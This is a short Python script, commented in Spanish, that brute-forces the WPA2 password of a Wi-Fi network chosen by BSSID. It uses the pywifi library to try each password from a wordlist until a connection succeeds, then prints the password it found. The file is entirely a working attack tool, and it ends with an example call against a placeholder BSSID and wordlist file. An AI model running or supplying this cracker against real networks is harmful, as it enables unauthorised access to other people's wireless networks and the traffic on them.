import time
import pywifi

def crack_wifi_password(target_bssid, dictionary_file):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Puedes ajustar esto según tu configuración

    # Cargar lista de contraseñas desde el archivo
    with open(dictionary_file, 'r') as file:
        passwords = file.readlines()

    # Escanear las redes disponibles
    iface.scan()
    time.sleep(20) #2segundos
    scan_results = iface.scan_results()

    # Buscar la red objetivo en los resultados del escaneo
    target_network = None
    for result in scan_results:
        if result.bssid == target_bssid:
            target_network = result
            break

    if target_network is None:
        print(f"No se encontró la red con BSSID {target_bssid}.")
        return

    # Crear objeto de perfil para la red objetivo
    profile = pywifi.Profile()
    profile.ssid = target_network.ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    
    # Iterar sobre contraseñas e intentar autenticarse
    for password in passwords:
        password = password.strip()
        profile.key = password
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)

        iface.connect(temp_profile)
        time.sleep(2)

        if iface.status() == pywifi.const.IFACE_CONNECTED:
            print(f"Contraseña encontrada: {password}")
            iface.disconnect()
            break
    else:
        print("Contraseña no encontrada en la lista proporcionada.")

# Uso del método
# PROGRAMA PRINCIPAL
crack_wifi_password("00:11:22:33:44:55", "lista_contrasenias.txt")
